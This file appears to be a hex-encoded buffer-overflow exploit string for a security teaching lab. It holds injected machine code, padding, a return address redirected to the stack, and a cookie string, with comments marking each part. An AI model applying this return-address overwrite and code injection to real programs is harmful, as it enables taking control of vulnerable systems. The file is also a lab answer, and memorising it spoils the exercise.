48 c7 c7 b0 dc 61 55 68 /* should be the exploit code */
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* below is the position of original returning ADDR */
78 dc 61 55 00 00 00 00 /* the address of exploit code - start of rsp */
/* 24 1f 40 00 00 00 00 00 */ /* remain unchanged */
00 00 00 00 00 00 00 00 /* trailing \0 */
35 39 62 39 39 37 66 61 /* put string repr here */
00 00 00 00 00 00 00 00 /* trailing \0 */
